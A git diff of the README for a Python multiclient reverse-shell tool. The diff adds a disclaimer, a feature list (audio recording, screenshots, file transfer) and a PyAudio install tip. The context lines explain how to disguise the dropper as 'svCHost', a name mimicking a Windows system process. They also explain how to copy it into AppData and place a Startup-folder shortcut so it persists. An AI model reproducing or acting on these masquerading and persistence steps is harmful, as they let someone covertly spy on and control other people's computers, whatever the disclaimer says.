@@ -1,7 +1,8 @@
+## Disclaimer
+This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
 # Multiclient-Reverse-shell
 Reverse shell using socket programming in python.
-
-Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
+With features like sound recording, screenshot,upload and download files.
 # prerequisite
 * python 3.7.x
 # How to Use
@@ -40,3 +41,9 @@ $copy dropper.py svCHost.py\
 And than create its exe.
 
 To put both the exe at some location and just run copy.exe to it will copy the svCHost.exe in C:\Users\<username>\AppData\Local\Microsoft or C:\Users\<username>\AppData\Local\Microsoft\office and creates its shortcut in startup folder.
+
+# Pyaudio error
+try this:\
+$pipwin install pyaudio\
+or\
+refer to this:https://stackoverflow.com/questions/52283840/i-cant-install-pyaudio-on-windows-how-to-solve-error-microsoft-visual-c-14
